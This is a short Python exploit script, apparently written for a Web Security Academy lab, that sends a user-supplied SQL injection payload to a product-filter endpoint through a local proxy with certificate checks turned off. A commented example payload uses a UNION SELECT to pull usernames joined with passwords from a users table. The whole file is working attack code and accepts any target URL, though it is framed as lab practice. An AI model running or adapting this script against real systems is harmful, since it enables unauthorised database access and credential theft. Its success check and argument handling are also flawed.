# SQL injection UNION attack, retrieving multiple values in a single column

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0a47005804d57cec8035ad5d003100a4.web-security-academy.net'
# payload = "' UNION SELECT NULL, username||password from users--"

def exploit_sqli(url, payload):
    uri = '/filter?category=Gifts'
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "UNION SELECT NULL" in r.text:
        print(r.text)
        return True
    else:
        return False
    
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

if exploit_sqli(url, payload):
    print("[+] SQL injection successfully")
else:
    print("[-] SQL injection failed")



